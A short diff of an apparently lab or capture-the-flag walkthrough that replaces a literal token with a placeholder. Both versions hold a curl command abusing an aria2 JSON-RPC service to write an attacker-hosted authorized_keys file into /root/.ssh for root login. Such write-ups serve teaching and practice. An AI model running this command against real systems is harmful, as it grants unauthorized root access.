@@ -40,7 +40,7 @@ Give appropriate permissions to the private key
 
 ### 4) Write the public key on the target machine using the aria2 service
 
-    curl http://localhost:6800/jsonrpc -d '{"jsonrcp":"2.0","id":"root","method":"aria2.addUri","params":["token:mEHNghqcNiF3KV",["http://192.168.45.200/authorized_keys"],{"out":"/root/.ssh/authorized_keys"}]}'
+    curl http://localhost:6800/jsonrpc -d '{"jsonrcp":"2.0","id":"root","method":"aria2.addUri","params":["token:RPC_SECRET",["http://192.168.45.200/authorized_keys"],{"out":"/root/.ssh/authorized_keys"}]}'
 
 ### 5) Login as root
 
